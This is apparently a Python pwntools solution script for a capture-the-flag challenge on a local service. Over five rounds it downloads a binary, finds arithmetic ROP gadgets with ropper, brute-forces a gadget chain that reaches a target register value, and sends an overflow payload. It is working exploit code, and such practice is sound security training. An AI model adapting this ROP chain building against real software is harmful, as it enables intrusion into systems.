from random import randint, choice, shuffle
from pwn import *
import re
import itertools

MAX_NUM = 0xffff
ARITH_STEP_LENGTH = 10

r = remote("localhost", "11001")
for i in range(5):
	instructions =  r.recvline().decode()
	target = int(re.search("call print\(\) with rax = (.*)",instructions).group(1),16)
	with open(f"binary{i}","wb") as f:
		f.write(bytes.fromhex(r.recvline().rstrip().decode()))
	exe = ELF(f"binary{i}")
	print(hex(target))

	def chunks(lst, n):
	   """Yield successive n-sized chunks from lst."""
	   for i in range(0, len(lst), n):
	       yield lst[i:i + n]


	with process(["ropper", "-f", f"binary{i}", "--nocolor", "--search", "lea"]) as ropper:
		gadgets = ropper.recvall().decode()
		found_arith_gadgets = []
		start_addr = 0x401004
		start = u16(exe.read(0x00401007, 2))
		constants = [u16(x) for x in chunks(exe.read(exe.symbols['constants'], 2*160),2)]
		for line in gadgets.split("\n"):
			gadget = re.search("(0x[0-9a-fA-F]+): lea rbx, \[(0x[0-9a-fA-F]+)\]; ([a-z]+) ax, word ptr \[rbx\]; ret;", line)
			if gadget:
				addr, rhs, op = (int(gadget.group(1),16), int(gadget.group(2),16), gadget.group(3).upper())
				rhs = constants[(rhs - exe.symbols['constants'])//2]
				found_arith_gadgets.append((addr, op, rhs))

	op_map = {
		"ADD": lambda x, y: (x + y) & MAX_NUM,
		"SUB": lambda x, y: (x - y) & MAX_NUM,
		"XOR": lambda x, y: (x ^ y) & MAX_NUM,
	}

	op_addr_map = {(b,c): a for a,b,c in found_arith_gadgets}
	op_op_map = {(b,c): (lambda lhs: op_map[b](lhs, c)) for a,b,c in found_arith_gadgets}

	seq = None
	for possible in itertools.product(op_op_map.items(), repeat=ARITH_STEP_LENGTH):
		value = start
		for op, f in possible:
			value = f(value)
		if value == target:
			seq = [op_addr_map[op] for op, _ in possible]
			break

	payload = b"A" * 8 + p64(0x401004)
	for a in seq:
		payload += p64(a)
	payload += p64(exe.symbols['print'])
	r.sendline(payload.hex())

r.interactive()
